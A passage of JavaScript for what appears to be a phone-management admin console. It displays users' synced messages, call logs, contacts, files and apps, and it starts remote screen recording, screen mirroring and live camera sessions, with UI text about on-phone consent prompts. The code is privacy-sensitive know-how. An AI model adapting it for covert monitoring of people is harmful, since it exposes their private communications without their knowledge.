    if (!transferId) throw new Error("No transferId returned");
    if (status) status.textContent = "Waiting for phone upload…";
    await pollAdminTransfer(exploreCtx.ownerUid, transferId, item, body, status);
  } catch (e) {
    if (body) body.textContent = formatApiError(e);
    if (status) status.textContent = "";
  }
}

async function pollAdminTransfer(ownerUid, transferId, item, body, status) {
  const deadline = Date.now() + 90_000;
  while (Date.now() < deadline) {
    const data = await api(
      `/api/admin/users/${encodeURIComponent(ownerUid)}/transfers/${encodeURIComponent(transferId)}`
    );
    const t = data.transfer || {};
    const st = String(t.status || "");
    if (status) {
      status.textContent =
        st === "ready"
          ? "Ready"
          : `Status: ${st || "…"} · ${Math.round(Number(t.progress || 0))}%`;
    }
    if (st === "ready") {
      const url = `/api/admin/users/${encodeURIComponent(ownerUid)}/transfers/${encodeURIComponent(transferId)}/content`;
      const type = String(item.type || "").toLowerCase();
      const mime = String(item.mimeType || t.mimeType || "");
      const res = await fetch(url, { headers: { Authorization: `Bearer ${idToken}` } });
      if (!res.ok) throw new Error(`Download failed (HTTP ${res.status})`);
      const blob = await res.blob();
      const objectUrl = URL.createObjectURL(blob);
      if (type === "image" || mime.startsWith("image/")) {
        body.innerHTML = `<img src="${objectUrl}" alt="${escapeHtml(item.displayName || "")}" />
          <p style="margin-top:10px;"><a class="btn-secondary" href="${objectUrl}" download="${escapeHtml(item.displayName || "image")}">Download image</a></p>`;
      } else if (type === "video" || mime.startsWith("video/")) {
        body.innerHTML = `<video src="${objectUrl}" controls playsinline></video>
          <p style="margin-top:10px;"><a class="btn-primary" href="${objectUrl}" download="${escapeHtml(item.displayName || "video")}">Download video</a></p>`;
      } else if (type === "audio" || mime.startsWith("audio/")) {
        body.innerHTML = `<audio src="${objectUrl}" controls></audio>
          <p style="margin-top:10px;"><a class="btn-primary" href="${objectUrl}" download="${escapeHtml(item.displayName || "audio")}">Download audio</a></p>`;
      } else {
        body.innerHTML = `<p class="muted">File ready.</p>
          <p><a class="btn-primary" href="${objectUrl}" download="${escapeHtml(item.displayName || "file")}">Download file</a></p>`;
      }
      if (status) status.textContent = "Loaded.";
      return;
    }
    if (st === "failed" || st === "cancelled" || st === "expired") {
      throw new Error(t.errorMessage || t.errorCode || `Transfer ${st}`);
    }
    await new Promise((r) => setTimeout(r, 1500));
  }
  throw new Error("Timed out waiting for phone upload. Keep the phone online and try again.");
}

function renderMessagesPanel() {
  const el = document.getElementById("admin-messages-body");
  if (!el || !exploreCtx) return;
  const items = exploreCtx.data.messages || [];
  if (!items.length) {
    el.innerHTML = emptyHint("No messages cached. Tap Sync from phone.");
    return;
  }
  el.innerHTML = `<ul class="admin-readable-list">${items
    .slice(0, 50)
    .map(
      (m) =>
        `<li>
          <strong>${escapeHtml(m.address || m.contactName || "Unknown")}</strong>
          <span class="muted"> · ${escapeHtml(m.type || m.direction || "")}</span>
          <div>${escapeHtml(m.body || m.text || "")}</div>
          <div class="muted">${fmtTime(m.date || m.createdAt)}</div>
        </li>`
    )
    .join("")}</ul>`;
}

function renderCallLogsPanel() {
  const el = document.getElementById("admin-call-logs-body");
  if (!el || !exploreCtx) return;
  const items = exploreCtx.data.callLogs || [];
  if (!items.length) {
    el.innerHTML = emptyHint("No call logs cached. Tap Sync from phone.");
    return;
  }
  el.innerHTML = `<ul class="admin-readable-list">${items
    .slice(0, 50)
    .map(
      (c) =>
        `<li>
          <strong>${escapeHtml(c.number || c.cachedName || "Unknown")}</strong>
          <span class="muted"> · ${escapeHtml(c.type || "")} · ${escapeHtml(String(c.duration ?? ""))}s</span>
          <div class="muted">${fmtTime(c.date || c.createdAt)}</div>
        </li>`
    )
    .join("")}</ul>`;
}

function renderContactsPanel() {
  const el = document.getElementById("admin-contacts-body");
  if (!el || !exploreCtx) return;
  const items = exploreCtx.data.contacts || [];
  if (!items.length) {
    el.innerHTML = emptyHint("No contacts cached. Tap Sync from phone.");
    return;
  }
  el.innerHTML = `<ul class="admin-readable-list">${items
    .slice(0, 80)
    .map(
      (c) =>
        `<li>
          <strong>${escapeHtml(c.displayName || c.name || "Contact")}</strong>
          <span class="muted"> · ${escapeHtml(c.phone || c.number || (c.phones || [])[0] || "")}</span>
        </li>`
    )
    .join("")}</ul>`;
}

function renderFilesPanel() {
  const el = document.getElementById("admin-files-body");
  if (!el || !exploreCtx) return;
  const grants = exploreCtx.data.folderGrants || [];
  if (!grants.length) {
    el.innerHTML = emptyHint(
      "No shared folders yet. On the phone, grant folder access under Permissions, then tap Refresh folders here."
    );
    return;
  }
  el.innerHTML = `<ul class="admin-readable-list">${grants
    .map(
      (g) =>
        `<li>
          <strong>${escapeHtml(g.displayName || g.name || g.path || g.id)}</strong>
          <div class="muted">${escapeHtml(g.uri || g.path || "")}</div>
        </li>`
    )
    .join("")}</ul>`;
}

function renderScreenPanel() {
  const el = document.getElementById("admin-screen-body");
  if (!el || !exploreCtx) return;
  el.innerHTML = `
    <p class="muted">Starts screen mirror via Platform Admin. Android will show the system cast dialog on the phone.</p>
    <div class="connect-actions" style="margin-top:12px;">
      <button type="button" class="btn-primary" id="btn-admin-screen-start">Start screen mirror</button>
      <button type="button" class="btn-danger" id="btn-admin-screen-stop">Stop</button>
    </div>
    <p id="screen-live-status" class="muted" style="margin-top:10px;" aria-live="polite"></p>
    <video id="admin-screen-video" class="admin-live-video" autoplay playsinline muted controls hidden></video>
  `;
  document.getElementById("btn-admin-screen-start")?.addEventListener("click", () => {
    void startLive(exploreCtx.ownerUid, exploreCtx.deviceId, ["screenMirror"], false, "auto", {
      statusId: "screen-live-status",
      videoId: "admin-screen-video",
    });
  });
  document.getElementById("btn-admin-screen-stop")?.addEventListener("click", async () => {
    await stopLiveViewer();
    const st = document.getElementById("screen-live-status");
    if (st) st.textContent = "Screen mirror stopped.";
    const v = document.getElementById("admin-screen-video");
    if (v) v.hidden = true;
  });
}

function renderRecordingPanel() {
  const el = document.getElementById("admin-recording-body");
  if (!el || !exploreCtx) return;
  const items = exploreCtx.data.screenRecordings || [];
  el.innerHTML = items.length
    ? `<ul class="admin-readable-list">${items
        .slice(0, 30)
        .map(
          (r) =>
            `<li>
              <strong>${escapeHtml(r.displayName || r.name || r.id)}</strong>
              <span class="muted"> · ${escapeHtml(r.status || "")} · ${fmtTime(r.createdAt || r.startedAt)}</span>
            </li>`
        )
        .join("")}</ul>`
    : emptyHint("No screen recordings cached yet.");
}

function renderAppsPanel() {
  const el = document.getElementById("admin-apps-body");
  if (!el || !exploreCtx) return;
  const items = exploreCtx.data.apps || [];
  if (!items.length) {
    el.innerHTML = emptyHint("No apps cached. Tap Sync apps.");
    return;
  }
  el.innerHTML = `<ul class="admin-readable-list">${items
    .slice(0, 100)
    .map(
      (a) =>
        `<li>
          <strong>${escapeHtml(a.appName || a.label || a.packageName)}</strong>
          <div class="muted"><code>${escapeHtml(a.packageName || "")}</code> · v${escapeHtml(a.versionName || "?")}</div>
        </li>`
    )
    .join("")}</ul>`;
}

function wireAdminCommands() {
  document.querySelectorAll("[data-admin-cmd]").forEach((btn) => {
    btn.onclick = () => {
      if (!exploreCtx) return;
      void runDeviceCommand(
        exploreCtx.ownerUid,
        exploreCtx.deviceId,
        btn.getAttribute("data-admin-cmd")
      );
    };
  });
  const recStart = document.getElementById("btn-admin-rec-start");
  const recStop = document.getElementById("btn-admin-rec-stop");
  if (recStart) {
    recStart.onclick = () => {
      if (!exploreCtx) return;
      void runDeviceCommand(exploreCtx.ownerUid, exploreCtx.deviceId, "SCREEN_RECORD_START");
    };
  }
  if (recStop) {
    recStop.onclick = () => {
      if (!exploreCtx) return;
      void runDeviceCommand(exploreCtx.ownerUid, exploreCtx.deviceId, "SCREEN_RECORD_STOP");
    };
  }
}

async function runDeviceCommand(ownerUid, deviceId, action) {
  const status = document.getElementById("admin-action-status");
  try {
    if (status) status.textContent = `Sending ${action}…`;
    await api(
      `/api/admin/users/${encodeURIComponent(ownerUid)}/devices/${encodeURIComponent(deviceId)}/command`,
      { method: "POST", body: JSON.stringify({ action, payload: {} }) }
    );
    if (status) {
      status.textContent = `${action} sent. Waiting for phone… refreshing in 3s.`;
    }
    setTimeout(() => {
      void openDeviceExplore(ownerUid, deviceId);
    }, 3000);
  } catch (e) {
    if (status) status.textContent = formatApiError(e);
    else alert(formatApiError(e));
  }
}

async function startLive(ownerUid, deviceId, capabilities, forceReplace, quality = "auto", opts = {}) {
  const statusId = opts.statusId || "live-status";
  const videoId = opts.videoId || "admin-live-video";
  const status = document.getElementById(statusId);
  const video = document.getElementById(videoId);
  const audio = document.getElementById("admin-live-audio");
  try {
    await stopLiveViewer();
    liveControlState = { torch: false, micMuted: false, videoRec: false, audioRec: false };
    if (status) status.textContent = "Starting live session…";
    if (video) video.hidden = false;
    show(document.getElementById("admin-live-panel"), true);
    show(document.getElementById("admin-live-controls"), true);
    const endBtn = document.getElementById("btn-admin-end-live");
    if (endBtn) endBtn.hidden = false;

    let result;
    try {
      result = await api(
        `/api/admin/users/${encodeURIComponent(ownerUid)}/devices/${encodeURIComponent(deviceId)}/session/start`,
        {
          method: "POST",
          body: JSON.stringify({ capabilities, forceReplace: Boolean(forceReplace), quality }),
        }
      );
    } catch (e) {
      if (e instanceof ApiError && e.code === "USER_SESSION_ACTIVE") {
        const ok = confirm(
          `${e.message}\n\n${e.howTo || ""}\n\nTake over now? (Ends their same-type live session only.)`
        );
        if (!ok) {
          if (status) status.textContent = "Cancelled — user session left running.";
          return;
        }
        result = await api(
          `/api/admin/users/${encodeURIComponent(ownerUid)}/devices/${encodeURIComponent(deviceId)}/session/start`,
          {
            method: "POST",
            body: JSON.stringify({ capabilities, forceReplace: true, quality }),
          }
        );
      } else {
        throw e;
      }
    }
    if (!firebaseConfig) throw new Error("Firebase config missing");
    if (!video) throw new Error("Video element missing");
    activeLiveSessionId = String(result.sessionId || "");
    if (status) {
      status.textContent =
        result.notes ||
        "Request authorized. Tap the notification on your phone to start.";
    }
    liveViewer = await startAdminLiveViewer({
      firebaseConfig,
      customToken: result.customToken,
      ownerUid: result.ownerUid,
      sessionId: result.sessionId,
      iceServers: Array.isArray(result.iceServers)
        ? result.iceServers
        : result.iceServers?.iceServers || [],
      videoEl: video,
      audioEl: audio || undefined,
      onStatus: (m) => {
        if (status) status.textContent = m;
      },
    });
  } catch (e) {
    activeLiveSessionId = "";
    if (status) status.textContent = formatApiError(e);
    else alert(formatApiError(e));
  }
}

function setAuthError(message) {
  if (!authStatus) return;
  authStatus.textContent = message || "";
  authStatus.classList.toggle("admin-auth-error", Boolean(message));
}

function setLoginBusy(on, message = "") {
  const hint = document.getElementById("auth-loading-hint");
  const emailBtn = document.getElementById("btn-login-email");
  const googleBtn = document.getElementById("btn-login-google");
  document.body.classList.toggle("admin-login-busy", Boolean(on));
  if (emailBtn) emailBtn.disabled = Boolean(on);
  if (googleBtn) googleBtn.disabled = Boolean(on);
  if (hint) {
    hint.hidden = !on;
    if (on && message) hint.textContent = message;
  }
  if (on && message) {
    if (authStatus) {
      authStatus.classList.remove("admin-auth-error");
      authStatus.textContent = message;
    }
  }
}

function setAdminLoading(on, message = "Loading…") {
  const overlay = document.getElementById("admin-loading");
  const text = document.getElementById("admin-loading-text");
  if (text && message) text.textContent = message;
  show(overlay, Boolean(on));
}

async function enterAdmin(user) {
  setAdminLoading(true, "Checking admin access…");
  setLoginBusy(true, "Checking admin access…");
  idToken = await user.getIdToken(true);
  setAdminLoading(true, "Verifying admin permissions…");
  const me = await api("/api/admin/me");
  if (!me.isAdmin) {
    show(viewLogin, false);
    show(viewApp, false);
    show(viewDenied, true);
    if (deniedEmail) deniedEmail.textContent = `Signed in as ${user.email || user.uid}`;
    return;
  }
  show(viewLogin, false);
  show(viewDenied, false);
  show(viewApp, true);
  if (adminUser) adminUser.textContent = me.email || user.email || "";
  setAdminLoading(true, "Loading dashboard…");
  activeTab = "dashboard";
  document.querySelectorAll("#admin-main-tabs .admin-tab").forEach((btn) => {
    btn.classList.toggle("active", btn.getAttribute("data-tab") === "dashboard");
  });
  document.querySelectorAll(".admin-panel").forEach((panel) => {
    panel.hidden = panel.id !== "tab-dashboard";
  });
  setUsersSubview("list");
  await loadDashboard();
  setAuthError("");
  if (authStatus) authStatus.textContent = "";
}

function setLoggedOut() {
  if (loginInProgress) return;
  idToken = "";
  void stopLiveViewer();
  exploreCtx = null;
  openUserUid = "";
  setAdminLoading(false);
  setLoginBusy(false);
  show(viewApp, false);
  show(viewDenied, false);
  show(viewLogin, true);
}

/** Complete login even when Firebase session already exists (onAuthStateChanged may not re-fire). */
async function completeAdminLogin(user) {
  if (!user) return;
  loginInProgress = true;
  try {
    await enterAdmin(user);
  } catch (e) {
    const msg = e instanceof Error ? e.message : String(e);
    setAuthError(msg);
    setAdminLoading(false);
    setLoginBusy(false);
    show(viewApp, false);
    show(viewDenied, false);
    show(viewLogin, true);
    try {
      loginInProgress = false;
      if (auth) await signOut(auth);
    } catch {
      /* ignore */
    }
    return;
  } finally {
    loginInProgress = false;
    setAdminLoading(false);
    setLoginBusy(false);
  }
}

async function loginWithEmailPassword() {
  const email = document.getElementById("auth-email")?.value?.trim();
  const password = document.getElementById("auth-password")?.value || "";
  if (!email || !password) {
    setAuthError("Enter email and password.");
    return;
  }
  if (!auth) {
    setAuthError("Sign-in is not ready yet. Wait a second and try again.");
    return;
  }
  loginInProgress = true;
  setAdminLoading(true, "Signing in…");
  setLoginBusy(true, "Signing in…");
  setAuthError("");
  try {
    const cred = await signInWithEmailAndPassword(auth, email, password);
    await completeAdminLogin(cred.user);
  } catch (e) {
    loginInProgress = false;
    setAdminLoading(false);
    setLoginBusy(false);
    const code = e?.code ? ` (${e.code})` : "";
    setAuthError((e instanceof Error ? e.message : String(e)) + code);
  }
}

async function main() {
  if (authStatus) {
    authStatus.classList.remove("admin-auth-error");
    authStatus.textContent = "Preparing sign-in…";
  }

  const cfgRes = await fetch("/api/config", { cache: "no-store" });
  if (!cfgRes.ok) throw new Error(`Failed to load /api/config (${cfgRes.status})`);
  const cfg = await cfgRes.json();
  firebaseConfig = cfg.firebase;
  if (!firebaseConfig?.apiKey || !firebaseConfig?.projectId) {
    throw new Error("Firebase web config missing on server. Check FIREBASE_WEB_* env vars.");
  }
  const app = initializeApp(firebaseConfig);
  auth = getAuth(app);

  document.querySelectorAll("#admin-main-tabs .admin-tab").forEach((btn) => {
    btn.addEventListener("click", () => setTab(btn.getAttribute("data-tab") || "dashboard"));
  });
  document.getElementById("btn-users-refresh")?.addEventListener("click", () => loadUsers());
  document.getElementById("users-search")?.addEventListener("keydown", (ev) => {
    if (ev.key === "Enter") void loadUsers();
  });
  document.getElementById("users-status")?.addEventListener("change", () => loadUsers());

  document.getElementById("btn-back-users")?.addEventListener("click", () => {
    void stopLiveViewer();
    setUsersSubview("list");
  });
  document.getElementById("btn-back-user-devices")?.addEventListener("click", () => {
    void stopLiveViewer();
    if (openUserUid) void openUser(openUserUid);
    else setUsersSubview("list");
  });
  document.getElementById("btn-device-refresh")?.addEventListener("click", () => {
    if (exploreCtx) void openDeviceExplore(exploreCtx.ownerUid, exploreCtx.deviceId);
  });
  document.getElementById("admin-device-select")?.addEventListener("change", (ev) => {
    const deviceId = ev.target.value;
    if (exploreCtx?.ownerUid && deviceId) {
      void stopLiveViewer();
      void openDeviceExplore(exploreCtx.ownerUid, deviceId);
    }
  });
  document.querySelectorAll("#admin-phone-tabs .phone-tab").forEach((btn) => {
    btn.addEventListener("click", () => setPhoneTab(btn.getAttribute("data-phone-tab") || "camera"));
  });

  document.getElementById("btn-admin-add")?.addEventListener("click", async () => {
    const input = document.getElementById("admin-email-input");
    const email = String(input?.value || "").trim();
    if (!email) return;
    try {
      await api("/api/admin/admins", { method: "POST", body: JSON.stringify({ email }) });
      if (input) input.value = "";
      await loadAdmins();
    } catch (e) {
      alert(e instanceof Error ? e.message : String(e));
    }
  });

  document.getElementById("btn-sync")?.addEventListener("click", async () => {
    const status = document.getElementById("dashboard-status");
    try {
      if (status) status.textContent = "Syncing from Firebase Auth…";
      const data = await api("/api/admin/sync-users", { method: "POST", body: "{}" });
      if (status) status.textContent = `Synced ${data.synced || 0} user(s).`;
      await loadDashboard();
      if (activeTab === "users") await loadUsers();
    } catch (e) {
      alert(e instanceof Error ? e.message : String(e));
    }
  });

  document.getElementById("btn-logout")?.addEventListener("click", () => signOut(auth));
  document.getElementById("btn-denied-logout")?.addEventListener("click", () => signOut(auth));

  document.getElementById("btn-admin-media-close")?.addEventListener("click", () => {
    show(document.getElementById("admin-media-viewer"), false);
    const body = document.getElementById("admin-media-body");
    if (body) body.innerHTML = "";
  });
  document.getElementById("admin-media-viewer")?.addEventListener("click", (ev) => {
    if (ev.target === document.getElementById("admin-media-viewer")) {
      show(document.getElementById("admin-media-viewer"), false);
    }
  });

  const loginForm = document.getElementById("admin-login-form");
  loginForm?.addEventListener("submit", (ev) => {
    ev.preventDefault();
    void loginWithEmailPassword();
  });

  document.getElementById("btn-login-google")?.addEventListener("click", async () => {
    if (!auth) {
      setAuthError("Sign-in is not ready yet. Wait a second and try again.");
      return;
    }
    loginInProgress = true;
    setAdminLoading(true, "Opening Google…");
    setLoginBusy(true, "Opening Google…");
    setAuthError("");
    try {
      const cred = await signInWithPopup(auth, new GoogleAuthProvider());
      await completeAdminLogin(cred.user);
    } catch (e) {
      loginInProgress = false;
      setAdminLoading(false);
      setLoginBusy(false);
      const code = e?.code ? ` (${e.code})` : "";
      setAuthError((e instanceof Error ? e.message : String(e)) + code);
    }
  });

  if (authStatus) authStatus.textContent = "Ready — enter email and password, then Sign in.";

  onAuthStateChanged(auth, async (user) => {
    if (!authBootstrapped) {
      authBootstrapped = true;
      if (user) {
        setAdminLoading(true, "Restoring admin session…");
        await completeAdminLogin(user);
      } else {
        setLoggedOut();
      }
      return;
    }
    // Later auth changes: ignore sign-in events (form handler owns that). Only handle logout.
    if (!user && !loginInProgress) setLoggedOut();
  });
}

main().catch((e) => {
  const msg = e instanceof Error ? e.message : String(e);
  setAuthError(msg);
  setAdminLoading(false);
  setLoginBusy(false);
});
